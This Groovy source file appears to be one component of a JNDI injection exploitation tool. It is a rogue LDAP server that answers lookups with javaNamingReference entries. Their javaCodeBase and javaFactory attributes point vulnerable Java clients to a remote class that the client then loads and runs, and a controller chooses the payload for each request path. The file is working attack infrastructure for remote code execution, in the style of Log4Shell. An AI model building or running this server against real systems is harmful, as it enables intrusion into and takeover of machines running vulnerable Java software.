package com.jndi.server

import com.jndi.utils.JndiMapping
import com.jndi.controller.JndiController
import com.jndi.entity.Jndi
import com.jndi.server.impl.JNDIServer
import com.unboundid.ldap.listener.InMemoryDirectoryServer
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig
import com.unboundid.ldap.listener.InMemoryListenerConfig
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import groovy.util.logging.Slf4j
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.beans.factory.annotation.Value

import javax.net.ServerSocketFactory
import javax.net.SocketFactory
import javax.net.ssl.SSLSocketFactory

@Slf4j
class LDAPServer extends InMemoryOperationInterceptor implements JNDIServer {

    @Value('${jndi.ip}')
    String ip

    @Value('${jndi.ldap.port}')
    Integer port

    @Value('${jndi.ldap.base}')
    String base

    @Autowired
    JndiController jndiController

    @Override
    void run(String... args) throws Exception {
        def config = new InMemoryDirectoryServerConfig(base)
        config.setListenerConfigs(new InMemoryListenerConfig(
                'listen',
                InetAddress.getByName("${ip}"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()))
        config.addInMemoryOperationInterceptor(this)
        def ds = new InMemoryDirectoryServer(config)
        ds.startListening()
        log.info("LDAP Server start on ${ip}:${port}")
    }

    @Override
    void processSearchResult(InMemoryInterceptedSearchResult result){
        def base = result.getRequest().getBaseDN()
        def index = base.indexOf('#')
        def path
        if (index != -1){
            path = base.substring(0, index)
        } else {
            path = base
        }
        def e = new Entry(base)
        def method = jndiController.getClass().getDeclaredMethod(path)
        def jndi
        if(method && method.isAnnotationPresent(JndiMapping.class)){
            jndi = method.invoke(jndiController, null) as Jndi
        } else {
            jndi = jndiController.hello()
        }
        def factoryLocation = jndi.factoryLocation
        def factory = jndi.factory
        e.addAttribute('javaClassName', jndi.className)
        e.addAttribute('javaCodeBase', factoryLocation)
        e.addAttribute('objectClass', 'javaNamingReference')
        e.addAttribute('javaFactory', factory)
        result.sendSearchEntry(e)
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS))
        log.info("LDAP ${base} ${factoryLocation}${factory}")
    }

}